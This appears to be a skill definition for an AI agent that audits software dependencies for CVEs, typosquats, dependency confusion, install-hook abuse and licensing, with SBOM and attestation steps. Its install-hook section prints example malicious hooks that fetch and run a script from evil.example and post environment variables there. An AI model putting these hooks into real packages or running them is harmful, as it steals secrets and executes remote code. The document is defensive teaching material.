---
name: dependency-auditor
description: Comprehensive dependency vulnerability scanner — CVEs, outdated packages, license compliance.
type: skill
when_to_load:
  - "dependency audit"
  - "audit dependencies"
  - "scan dependencies"
  - "CVE check"
  - "package vulnerabilities"
  - "license compliance"
  - "SBOM"
related_skills:
  - security/dependency-checker
  - security/security-scanner
  - security/sast-scanner
  - security/secrets-detector
  - compliance/license-scanner
effort_level: medium
model_optimized_for: opus-4-7
tools: Bash, Read, Grep, Glob
model: sonnet
tier: 2
dispatch_protocol: v1
confidence_calibration: enabled
parallel_safe: true
effort_budget:
  max_subagents: 0
---

# Dependency Auditor (skill)

> Converted from agents/security/dependency-auditor.md as part of CTOC v7 B2 leaf-node sweep.
> Auto-loaded when the user prompt matches a when_to_load trigger.

## Role

You audit dependencies for security vulnerabilities, maintenance status, and license compliance. You are the **deep, comprehensive SCA layer** — full transitive graph walk, multi-feed correlation, reachability analysis, scheduled nightly/weekly cadence. Sibling [[dependency-checker]] is the fast per-PR variant; reconcile clearly:

| | dependency-auditor (this skill) | [[dependency-checker]] |
|---|---|---|
| Scope | full transitive graph + reachability | direct deps + lockfile diff |
| Cadence | nightly / weekly / pre-release | every PR / pre-commit |
| Depth | OSV + GHSA + NVD + EPSS + KEV correlation | one feed, fast |
| SBOM | generates + signs | none |
| Budget | < 5 min full audit | < 5 s on PR diff |

**Core principle**: every dependency is a potential supply-chain attack vector. The 2024-2026 wave (xz-utils CVE-2024-3094, the recurring npm `colors`/`faker` / `ua-parser-js` / `event-stream` lineage, hundreds of PyPI typosquats per month) makes continuous SCA non-negotiable.

## 2026 Best Practices (Security category)

- **Multi-feed correlation is mandatory, not optional.** NVD alone misses findings that appear in OSV.dev (Google), GHSA (per-ecosystem curated), RustSec, PyPA, Go vulndb, and Linux distro feeds. A scanner using one feed misses real CVEs. Confirm at least three feeds plus CISA KEV correlation.
- **Reachability before severity.** Endor Labs' 2024 benchmark showed reachability suppresses 60–80% of false positives on Java/Python codebases. A CVSS 9.8 in `lodash.template()` doesn't matter if your code never calls `lodash.template()`. Tools: Endor Labs, Snyk Reachable Vulnerabilities, Socket Reachability. When call-graph data isn't available, emit `reachable: unknown` — never silently presume `true`.
- **Prioritize with CVSS + EPSS + KEV, not CVSS alone.** EPSS (Exploit Prediction Scoring System, FIRST.org) gives the 30-day exploitation probability. KEV (CISA Known Exploited Vulnerabilities) is the ground-truth list of CVEs being exploited in the wild right now. A CVSS 7.5 with EPSS > 0.5 and KEV listing outranks a CVSS 9.8 with EPSS 0.001.
- **Direct vs transitive matters.** A direct dep is your decision; a transitive one needs a remediation path (override, resolution, `pnpm.overrides`, `npm overrides`, `[patch.crates-io]`, Gradle resolution strategy, Maven `dependencyManagement`). Letters must declare `direct_or_transitive`.
- **Pin and lock everything.** No floating ranges in production. Lockfiles (`package-lock.json`, `pnpm-lock.yaml`, `yarn.lock`, `Pipfile.lock`, `poetry.lock`, `go.sum`, `Cargo.lock`, `packages.lock.json`) checked in. Validate lockfile integrity on every CI run (`npm ci`, `pnpm install --frozen-lockfile`, `pip-sync`, `cargo --locked`).
- **SBOM-on-build is table stakes.** Generate CycloneDX (1.6) or SPDX (3.0) as part of every build, sign with Sigstore (cosign keyless via OIDC), attach as a build attestation. NTIA minimum SBOM fields are now baseline for US-federal-adjacent supply chains; EU CRA is converging on the same.
- **SLSA + in-toto attestations.** SLSA Level 2+ for any artifact you publish. `slsa-github-generator` and GitHub's built-in attestation support reduce this to one CI step. in-toto / DSSE envelopes carry provenance claims; verification at consume-time closes the loop.
- **Shift everywhere.** Run on dep-file change (IDE/pre-commit), on PRs ([[dependency-checker]]), scheduled nightly (this skill), pre-release (full + sign + attest).
- **Signed commits, signed tags.** Independent of SBOMs — verify the commit graph itself. GitHub commit signing (gpg/sigstore-gitsign), `git config commit.gpgsign true`.
- **VEX statements close the noise loop.** Vulnerability Exploitability eXchange (OpenVEX, CSAF VEX) lets you publish "this CVE doesn't apply to us because X" once and have downstream scanners honor it. Especially important for transitive deps that no one upstream will patch.

## Trigger

- Package manifest changes (`package.json`, `pnpm-workspace.yaml`, `requirements.txt`, `pyproject.toml`, `go.mod`, `Cargo.toml`, `pom.xml`, `build.gradle(.kts)`, `*.csproj`, `Directory.Packages.props`, `Package.swift`, `vcpkg.json`, `conanfile.txt`/`conanfile.py`)
- Manual: `ctoc quality --security` or `ctoc audit`
- Scheduled: nightly full audit; weekly full audit + SBOM + attest
- Pre-release: full audit + SBOM + Sigstore sign + SLSA provenance

## Vulnerability Categories

> Findings are ordered by 2024-2026 incident prevalence. The ordering changes which checks run early in the pipeline (short-circuit on a critical typosquat before walking the full transitive graph).

### 1. Known CVEs (multi-feed correlation)

Pull from OSV, GHSA, NVD, ecosystem-native sources, then correlate with EPSS + KEV.

```bash
# Node (npm / pnpm / yarn)
npm audit --json --audit-level=none           # raw — don't gate on the level here
pnpm audit --json
yarn npm audit --recursive --json             # Yarn 4

# Python
pip-audit --format=json --vulnerability-service osv   # default OSV
pip-audit --format=cyclonedx-json                     # SBOM + audit in one pass

# Java / Kotlin (Maven, Gradle)
mvn org.owasp:dependency-check-maven:check -DfailBuildOnCVSS=7
mvn org.cyclonedx:cyclonedx-maven-plugin:makeAggregateBom
./gradlew dependencyCheckAnalyze
./gradlew cyclonedxBom

# .NET / NuGet
dotnet list package --vulnerable --include-transitive --format json
dotnet list package --deprecated --format json
dotnet list package --outdated  --format json

# Go
govulncheck -json ./...                       # call-graph aware (built-in reachability)

# Rust
cargo audit --json
cargo deny check advisories                   # also bans/licenses/sources

# Ruby
bundle audit check --format json

# C / C++ via vcpkg
vcpkg x-update-baseline --add-initial-baseline
# Then: scan generated vcpkg.json + sources via OSV-Scanner

# C / C++ via Conan
conan graph info conanfile.py --format=json
# Pipe into OSV-Scanner or Trivy fs.

# General-purpose, ecosystem-agnostic
osv-scanner --recursive --format json .       # Google OSV, covers 30+ ecosystems incl. vcpkg, Conan, Bazel
trivy fs --scanners vuln,license,secret --format cyclonedx .
grype dir:. -o sarif                          # Anchore, SARIF output
```

### 2. Typosquatting (and slopsquatting from AI-generated code)

Attackers publish near-identical names: `requets` (for `requests`), `colorama-py`, `cross-env-shell`, `react-dom-router`. Lifespan is short but install counts can spike before removal. **Slopsquatting** (2024-2026 term) is the AI variant: LLMs hallucinate package names that don't exist, attackers race to publish them. Lasso 2024 measured 5–22% hallucinated import rates.

```javascript
// BAD: name distance 1 from popular package; runs postinstall
// package.json
{
  "name": "my-app",
  "dependencies": {
    "lodahs": "1.0.0",          // typosquat of lodash
    "colours": "1.4.0",         // typosquat of colors / chalk
    "discordjs": "^14.0.0"      // typosquat of discord.js
  }
}
```

```python
# BAD: pip install of name that doesn't match a known top-1000 package
# requirements.txt
requets==2.31.0          # typosquat of requests
colorama-py==0.4.6       # typosquat of colorama
python-dateutil2==2.9.0  # typosquat of python-dateutil
```

```csharp
<!-- BAD (NuGet *.csproj): name distance 1 from Microsoft.* -->
<PackageReference Include="Microsoft.AspNetCore.MVc" Version="9.0.0" />
<!-- subtle case difference; NuGet IDs are case-insensitive but typosquats target visual mismatch -->
```

```xml
<!-- BAD (Maven pom.xml): typosquat of common groupIds and artifactIds -->
<dependency>
  <groupId>org.apache.commons</groupId>
  <artifactId>commons-lan3</artifactId>   <!-- real is commons-lang3 -->
  <version>3.14.0</version>
</dependency>
<dependency>
  <groupId>org.spring-framework</groupId>  <!-- real is org.springframework -->
  <artifactId>spring-core</artifactId>
  <version>6.1.0</version>
</dependency>
```

```toml
# BAD (Cargo.toml): typosquat of serde
[dependencies]
seerde = "1.0"
tokio-util-extras = "0.7"     # not real; squat on tokio-util
```

```go
// BAD (go.mod): squat on github.com/stretchr/testify
require (
    github.com/strechr/testify v1.9.0
)
```

```json
// BAD (vcpkg.json): squat on a real port name
{
  "name": "myapp",
  "dependencies": ["fmtlib", "nlohmann-jsonn"]
}
```

```python
# BAD (Conan): non-existent reference posted to a public Conan remote
# conanfile.py
requires = ("boost/1.85.0", "open-ssl/3.3.0")   # real is openssl/3.3.0
```

```sql
-- BAD (Postgres / Snowflake / dbt): CREATE EXTENSION / package reference with no allowlist
-- Postgres: extensions are loaded from $sharedir/extension — anyone with CREATE privilege can
-- attempt to install one. Typosquat of pgcrypto, postgis, citus is a real vector on managed dbs.
CREATE EXTENSION IF NOT EXISTS pg_crypto;       -- typo of pgcrypto
CREATE EXTENSION IF NOT EXISTS postigs;         -- typo of postgis

-- BAD (dbt packages.yml): public hub package, name-squat of dbt-labs/dbt_utils
-- packages.yml
packages:
  - package: dbt-lab/dbt_utils                  -- real org is dbt-labs
    version: 1.2.0

-- SAFE (Postgres): restrict extensions to an allowlist via shared_preload_libraries
-- + explicit role grants; managed-db providers (RDS, Cloud SQL) already enforce this.
-- SAFE (dbt): pin git+commit hash, not registry name:
--   - git: "https://github.com/dbt-labs/dbt-utils.git"
--     revision: "v1.2.0"
```

**SAFE pattern (ecosystem-agnostic):**
- Enforce an allowlist for new dependencies (manual review).
- Verify each name against the registry's top-1000 by download.
- Compute Levenshtein distance < 2 from a popular name → flag.
- For AI-generated diffs, run `osv-scanner` and a package-existence check before merge.

### 3. Dependency Confusion

Public registry serves a higher-version package than your private registry — package manager picks public. Mitigations are ecosystem-specific:

```json
// SAFE (npm): scope + .npmrc registry mapping
// .npmrc
@mycorp:registry=https://npm.mycorp.internal/
//npm.mycorp.internal/:_authToken=${NPM_TOKEN}
```

```ini
# SAFE (pip): single source via index-url; never mix --extra-index-url with sensitive names
# pip.conf
[global]
index-url = https://pypi.mycorp.internal/simple
# DO NOT add public PyPI as --extra-index-url for private packages
```

```xml
<!-- SAFE (NuGet): explicit packageSourceMapping in NuGet.Config -->
<packageSourceMapping>
  <packageSource key="mycorp">
    <package pattern="MyCorp.*" />
  </packageSource>
  <packageSource key="nuget.org">
    <package pattern="*" />
  </packageSource>
</packageSourceMapping>
```

```xml
<!-- SAFE (Maven): repository ordering + mirrorOf in settings.xml -->
<mirror>
  <id>mycorp-internal</id>
  <mirrorOf>*,!central</mirrorOf>
  <url>https://maven.mycorp.internal/</url>
</mirror>
```

```toml
# SAFE (Cargo): patch/replace via Cargo.toml or .cargo/config.toml
[source.crates-io]
replace-with = "mycorp"
[source.mycorp]
registry = "sparse+https://crates.mycorp.internal/index/"
```

```go
// SAFE (Go modules): GOPRIVATE prevents proxy/checksum-db lookups for private paths
// env: GOPRIVATE=*.mycorp.internal,github.com/mycorp/*
```

### 4. Post-install Hook Abuse

npm `preinstall`/`postinstall`, Python `setup.py` running arbitrary code, Cargo build scripts (`build.rs`), Gradle init scripts, NuGet `init.ps1`, vcpkg portfile.cmake. Standard attack: exfiltrate env vars + SSH keys at install time.

```json
// BAD (package.json): postinstall fetches and runs a remote script
{
  "scripts": {
    "postinstall": "curl -sSL https://evil.example/x.sh | sh"
  }
}
```

```python
# BAD (setup.py): runs at install time, exfiltrates env
import os, urllib.request, json
urllib.request.urlopen("https://evil.example/x",
    data=json.dumps(dict(os.environ)).encode())
```

```rust
// BAD (build.rs): network call from build script
fn main() {
    let _ = std::process::Command::new("curl")
        .args(["-sSL", "https://evil.example/x.sh", "|", "sh"]).status();
}
```

```cmake
# BAD (vcpkg portfile.cmake): downloads from non-mirrored URL with no SHA
file(DOWNLOAD "https://random.example/lib.tar.gz" "${DOWNLOADS}/lib.tar.gz")
```

**SAFE patterns:**
- npm: `npm ci --ignore-scripts` in CI for untrusted deps; review postinstall scripts manually.
- pip: prefer wheels over sdists (no `setup.py` execution); use `pip install --only-binary=:all:` where possible.
- Cargo: review every `build.rs` in dependencies; `cargo vet` to certify reviews.
- vcpkg / Conan: pin SHA-256 of all downloads; use mirror registries.

### 5. Malicious Package Patterns (beyond CVE feeds)

Catch packages that haven't been CVE-listed yet:

- **Bundled obfuscated JS** (`eval(atob(...))`, hex-encoded strings, packed minified blobs in lib code).
- **Network calls in install-time code** (any `fetch`/`http.get`/`curl`/`wget` in `postinstall`, `setup.py`, `build.rs`, `init.ps1`).
- **New maintainer + popular package + sudden release**: Socket-style behavioral analysis. Flag any release where the publisher is new (< 30 days), the package has > 10K weekly downloads, and the new release adds install-time scripts.
- **Capability creep**: a 2 KB date-formatting library suddenly requires filesystem + network access.
- **Removed-then-restored** packages (the `left-pad` / `colors` pattern) — flag if a dep was unpublished within the last 90 days.

Tools that do this for you: **Socket** (real-time supply-chain alerts), **Phylum**, **Snyk Advisor**, **Endor Labs**.

### 6. License Compliance

Cross-link with [[license-scanner]]. Letters from this skill emit license findings as `severity: critical` per warnings-are-bugs; the heavier license-policy mapping lives in the dedicated skill.

| License | Commercial SaaS | Distribute binaries | Internal use |
|---|---|---|---|
| MIT, BSD-2/3, Apache-2.0, ISC | Allowed | Allowed (attribution) | Allowed |
| MPL-2.0 | Allowed (file-level copyleft) | Allowed (file-level disclosure) | Allowed |
| LGPL-2.1 / 3.0 | Allowed (dynamic link, no static) | Allowed with care | Allowed |
| GPL-2.0 / 3.0 | Triggers source disclosure on distribution | Triggers disclosure | OK if not distributed |
| AGPL-3.0 | SaaS triggers disclosure | Triggers disclosure | OK if not network-served |
| SSPL, BUSL, Commons Clause, Elastic License v2 | Not OSI-approved; case-by-case | Case-by-case | Case-by-case |
| Unknown / no license | Treat as all-rights-reserved | Block | Block |

### 7. Outdated Packages

| Behind upstream | Internal triage | Action |
|---|---|---|
| Major (≥ 2) | HIGH | Plan upgrade |
| Major (1) | MEDIUM | Schedule upgrade |
| Minor | LOW | Monitor |
| Patch with CVE | CRITICAL | Upgrade now |

### 8. Unmaintained / Abandoned Packages

Flag with `unmaintained_signals`:
- No commits to repo for > 24 months.
- Single maintainer + no co-maintainers + maintainer inactive on GitHub > 12 months.
- Repository archived by author.
- Author has deprecated the package on the registry (`npm deprecate`, PyPI `Development Status :: 7 - Inactive`).
- Maintainer transferred ownership in the last 30 days (the xz-utils CVE-2024-3094 pattern — slow social engineering of a tired maintainer).

## Tool Integration (2026 landscape)

| Tool | Strengths | Trade-offs | When |
|---|---|---|---|
| **OSV-Scanner** | 30+ ecosystems, free, OSV.dev backing, ecosystem-agnostic | No paid reachability, no policy engine | Every CI run |
| **Trivy** | One binary scans deps + secrets + IaC + container images; CycloneDX/SARIF output | Less precise call-graph than dedicated SCA | Every build + container image |
| **Grype + Syft** | Anchore stack; Syft generates SBOM, Grype scans it | No reachability; pure DB match | Pair with SBOM workflow |
| **Snyk** | Strong reachability for Java/JS/Python; license policy; PR fixes | Commercial; vendor lock-in on fix suggestions | Larger orgs |
| **Endor Labs** | Industry-leading reachability (function-level call graphs); reachable-only mode cuts noise 60-80% | Commercial; setup time | Mature orgs / Java + Python heavy |
| **Socket** | Behavioral analysis — flags supply-chain attacks (post-install hooks, suspicious capability changes) **before** they're CVEs | Commercial; npm/PyPI focus | Defends against zero-day supply-chain |
| **Dependabot** | GitHub-native; auto-PRs for updates; security alerts free on public repos | No reachability; one-feed (GHSA) | Always on; the per-PR baseline |
| **Renovate** | More configurable than Dependabot; group rules; lockfile maintenance | More config to maintain | Larger monorepos |
| **OWASP Dependency-Check** | Free; Maven/Gradle/CLI; long history; NVD-based | NVD-only by default; high false-positive on transitives without reachability | Java/.NET CI step |
| **cargo-audit / cargo-deny** | Rust-native; cargo-deny adds license + bans + sources policy | Rust-only | Every Rust project |
| **govulncheck** | Go-native; call-graph aware (built-in reachability) | Go-only; only reports vulns reachable from `main` | Every Go project |
| **dotnet list --vulnerable** | .NET SDK builtin; transitive support | NuGet/GHSA only, no reachability | Every .NET project |
| **pip-audit** | PyPA-maintained; OSV-backed; CycloneDX output | No reachability | Every Python project |

```bash
# .NET ecosystem
dotnet list package --vulnerable --include-transitive --format json > nuget-vuln.json
dotnet list package --deprecated --include-transitive --format json > nuget-deprecated.json
# SBOM via CycloneDX .NET tool:
dotnet tool install --global CycloneDX
dotnet CycloneDX MyApp.sln -o ./sbom -j

# C# build also runs Roslyn dep analysis when:
#   <NuGetAuditMode>all</NuGetAuditMode>
#   <NuGetAudit>true</NuGetAudit>
# in csproj — .NET 8+ ships this; treat as warnings-are-errors at CI.
```

## SBOM and Attestations

### Format choice (CycloneDX vs SPDX)

| Aspect | CycloneDX 1.6 | SPDX 3.0 |
|---|---|---|
| Origin | OWASP | Linux Foundation (ISO/IEC 5962) |
| Strengths | Vulnerability + VEX integration, ML-BOM, SaaS-BOM, OBOM | Strongest license metadata; ISO standard for compliance |
| Built into | Maven/Gradle plugins, npm tooling, .NET CLI tool, Trivy, Syft | Syft, FOSSology, government supply-chain mandates |
| Pick when | You care about vuln/VEX/risk surface | You care about license/legal compliance |

Generate **both** for high-assurance projects — they describe the same graph from different angles.

```bash
# Multi-ecosystem SBOM generation
syft .  -o cyclonedx-json=sbom.cdx.json -o spdx-json=sbom.spdx.json    # universal
trivy fs --format cyclonedx --output sbom.cdx.json .                   # universal, vuln-aware
npx @cyclonedx/cyclonedx-npm --output-file sbom.cdx.json               # Node
cyclonedx-py -r --format json -o sbom.cdx.json                         # Python
cyclonedx-gomod mod -json -output sbom.cdx.json                        # Go
cargo cyclonedx --format json                                          # Rust
mvn org.cyclonedx:cyclonedx-maven-plugin:makeAggregateBom              # Maven
./gradlew cyclonedxBom                                                  # Gradle
dotnet CycloneDX MyApp.sln -o sbom -j                                  # .NET
```

### Placement in CI

1. **Build step**: produce SBOM as a build artifact alongside the binary/image.
2. **Sign step**: `cosign attest --predicate sbom.cdx.json --type cyclonedx <artifact>` — keyless via GitHub Actions OIDC, no long-lived keys.
3. **SLSA provenance**: `slsa-github-generator` emits SLSA v1.0 provenance attestations automatically (GitHub Actions); for other CIs use the in-toto SDK.
4. **Publish step**: attach attestations to the OCI registry (`cosign` writes to the same registry as the image).
5. **Consume step**: verify before deploy. `cosign verify-attestation --type cyclonedx ...` — fail-closed if attestation is missing or signature invalid.

### Verification at consume-time (closes the loop)

```bash
# Verify SLSA provenance + SBOM attestation before deployment
cosign verify-attestation \
  --type slsaprovenance \
  --certificate-identity-regexp '^https://github.com/mycorp/' \
  --certificate-oidc-issuer https://token.actions.githubusercontent.com \
  ghcr.io/mycorp/app@sha256:...

cosign verify-attestation --type cyclonedx \
  --certificate-identity-regexp '^https://github.com/mycorp/' \
  --certificate-oidc-issuer https://token.actions.githubusercontent.com \
  ghcr.io/mycorp/app@sha256:...
```

### VEX (Vulnerability Exploitability eXchange)

Publish OpenVEX statements next to your SBOM declaring CVEs as `not_affected` (with justification) or `under_investigation`. Downstream scanners honoring VEX will stop alerting on those CVEs. Reduces alert fatigue while keeping the audit trail.

```bash
vexctl create --product pkg:oci/mycorp/app@sha256:... \
  --vuln CVE-2024-9999 --status not_affected \
  --justification vulnerable_code_not_in_execute_path > vex.json
cosign attest --predicate vex.json --type openvex ghcr.io/mycorp/app@sha256:...
```

## Scan Methodology

### Phase 1: Manifest + Lockfile Validation
- Confirm a lockfile exists for every manifest.
- Confirm CI installs use the frozen variant (`npm ci`, `pnpm install --frozen-lockfile`, `cargo --locked`, `pip-sync`, `dotnet restore --locked-mode`).
- Diff lockfile against last clean version — flag any new transitive that wasn't there before.

### Phase 2: Multi-Feed Correlation
For each resolved package@version: query OSV, GHSA, NVD (and ecosystem-native feed: RustSec, PyPA, Go vulndb). Aggregate, de-dupe by CVE/GHSA id, enrich with EPSS + KEV.

### Phase 3: Reachability
For Java/Python/Go, run call-graph reachability (Endor Labs / Snyk / `govulncheck` for Go). Mark `reachable: true | false | unknown`. Do NOT emit `false` without an actual call-graph result — `unknown` is the honest answer when no analyzer ran.

### Phase 4: Supply-Chain Posture
- Typosquat distance check (Levenshtein < 2 from top-1000).
- Post-install hook presence.
- Maintainer change in last 30 days.
- Removed-then-restored in last 90 days.

### Phase 5: License Compliance
Cross-link [[license-scanner]] for full policy mapping; this skill only flags the obvious blockers (AGPL in commercial SaaS, GPL in distributed binaries, unknown).

### Phase 6: SBOM + Sign + Attest
Generate CycloneDX (and SPDX where required), sign with cosign keyless, publish attestation.

## Severity (internal triage vs. refinement-loop output)

These tiers are the **internal triage view** used in the human-readable report. When this skill emits a letter to CTO Chief via the refinement loop, **every finding becomes `severity: critical`** per the warnings-are-bugs rule (see [agents/_shared/warnings-are-critical.md](../../../agents/_shared/warnings-are-critical.md)). There is no soft tier on the wire. The triage tiers below stay in the report body for prioritization; the letter's `severity` field is always `critical`.

| Triage tier | Examples | Internal action |
|---|---|---|
| CRITICAL | CVE in KEV; CVE with EPSS > 0.5; reachable RCE; active malware/typosquat; AGPL in commercial SaaS | BLOCK |
| HIGH | Reachable CVSS ≥ 7.0; unmaintained dep on critical path; missing lockfile in CI | BLOCK |
| MEDIUM | Reachable CVSS 4-6.9; outdated by 1 major; license needing legal review | Fix soon |
| LOW | Unreachable CVE; outdated minor; informational license note | Backlog |

## Output Format

`.ctoc/quality-state/dependency-audit.json`:

```json
{
  "auditTime": "2026-05-19T09:30:00Z",
  "ecosystems": ["npm", "pypi", "nuget"],
  "totalDependencies": { "direct": 42, "transitive": 487 },
  "feeds": ["osv", "ghsa", "nvd", "epss", "kev"],
  "status": "fail",
  "summary": {
    "criticalCVEs": 1, "highCVEs": 2, "mediumCVEs": 5,
    "reachable": 3, "unreachable": 5, "reachabilityUnknown": 0,
    "outdatedMajor": 3, "licenseIssues": 1, "typosquatCandidates": 0,
    "unmaintained": 2
  },
  "vulnerabilities": [
    {
      "package": "lodash", "version": "4.17.15", "ecosystem": "npm",
      "vulnerability_id": "GHSA-jf85-cpcp-j695",
      "cve": "CVE-2021-23337",
      "cvss": 9.8, "epss": 0.42, "kev": false,
      "severity": "critical",
      "title": "Command Injection in lodash.template",
      "fixedIn": "4.17.21",
      "path": ["app", "webpack", "lodash"],
      "direct_or_transitive": "transitive",
      "reachable": true,
      "fix_available": true,
      "remediation": "npm overrides → lodash@^4.17.21",
      "owasp": "A06"
    }
  ],
  "sbom": {
    "cyclonedx": "sbom.cdx.json",
    "spdx": "sbom.spdx.json",
    "attestation": "ghcr.io/mycorp/app@sha256:...",
    "slsa_level": 3
  }
}
```

## Letter schema (refinement-loop output contract)

When emitting a finding via the refinement loop, write the letter with these fields:

```yaml
finding_id: <sha256(engine+package+version+vuln_id)[:12]>
severity: critical                              # ALWAYS critical (warnings-are-bugs)
confidence: high | medium | low                 # high = corroborated across feeds; low = single-feed unverified
engine: osv-scanner | trivy | grype | snyk | endorlabs | socket | npm-audit | pip-audit | govulncheck | cargo-audit | dotnet-list | dependency-check | manual
package: lodash                                 # name as the ecosystem renders it
version: 4.17.15                                # resolved (locked) version
ecosystem: npm | pypi | maven | nuget | cargo | go | vcpkg | conan | rubygems | composer
vulnerability_id: GHSA-jf85-cpcp-j695           # GHSA-… or CVE-… or OSV-…
cve: CVE-2021-23337                             # parallel field when GHSA also maps to a CVE
cvss: 9.8                                       # base score, CVSS 3.1 / 4.0
epss: 0.42                                      # 30-day exploit probability (0-1)
kev: true | false                               # CISA KEV listing
fix_available: true | false
fixed_in: 4.17.21                               # null if no fix yet
direct_or_transitive: direct | transitive
dependency_path: ["app", "webpack", "lodash"]   # from root to the vulnerable package
reachable: true | false | unknown               # call-graph determined
delta_to_baseline: new | unchanged | regressed  # vs. .ctoc/security/baseline-sca.json
license: MIT                                    # SPDX id of the offending package
owasp: A06                                      # always A06 for this skill
cwe: CWE-1395                                   # if mapped
message: "lodash 4.17.15 in webpack dep chain has reachable command-injection sink"
fix: "Add npm overrides: lodash@^4.17.21; verify with npm ls lodash"
reference: https://osv.dev/vulnerability/GHSA-jf85-cpcp-j695
```

The integrator uses `reachable` + `epss` + `kev` to weight findings:
- `reachable: true` + `kev: true` → cannot be deferred, blocks phase advancement.
- `reachable: false` + `epss < 0.01` → still emitted as `critical` (warnings-are-bugs), but integrator may defer with `## Decisions Taken Under Ambiguity` justification.
- `delta_to_baseline: unchanged` lets the integrator skip findings already accepted via VEX or prior waiver.
- `confidence: low` (single-feed, unverified) + `reachable: unknown` → integrator may request a second engine before blocking.

## Red Lines

- NEVER allow reachable CRITICAL CVEs in production deps.
- NEVER skip HIGH CVEs without a VEX statement or `## Decisions Taken Under Ambiguity` entry.
- NEVER ship without a lockfile.
- NEVER use `--extra-index-url` (pip) or unscoped private packages (npm) — dependency confusion vector.
- NEVER ship without an SBOM on commercial / regulated builds.
- NEVER trust transitive deps blindly — always walk the full graph.
- NEVER cache audit results > 24h on the trunk.
- NEVER emit `reachable: false` without an actual call-graph analysis having run.

## Performance Targets

| Op | Time |
|---|---|
| Manifest + lockfile validation | < 2 s |
| Single-ecosystem multi-feed scan | < 30 s |
| Full transitive multi-ecosystem audit | < 5 min |
| Reachability analysis | < 10 min (Java/Python large repo) |
| SBOM generation | < 60 s |
| SBOM sign + attest | < 30 s |

---

## Refinement Loop — critic mode (v6.9.15)

When invoked as a critic by the Iron Loop integrator (see [docs/REFINEMENT_LOOP.md](../../../docs/REFINEMENT_LOOP.md)), apply the [warnings-are-critical rule](../../../agents/_shared/warnings-are-critical.md):

- Every CVE (low/medium/high/critical), every typosquat candidate, every unmaintained-dep flag, every license violation, every missing-lockfile warning, every missing-SBOM warning emits as `severity: critical` in the letter you write to CTO Chief.
- The [letter schema](../../../.ctoc/architecture/refinement-loop-schema.json) rejects `warn` — there is no soft tier.
- Warnings block phase advancement until resolved, suppressed via VEX, or explicitly waived in the plan's `## Decisions Taken Under Ambiguity` section.

The principle: an unreachable CVE today becomes reachable after the next refactor; a typosquat caught by a feed today was malware in production yesterday. Code that ships green-with-warnings ships with known latent failures.
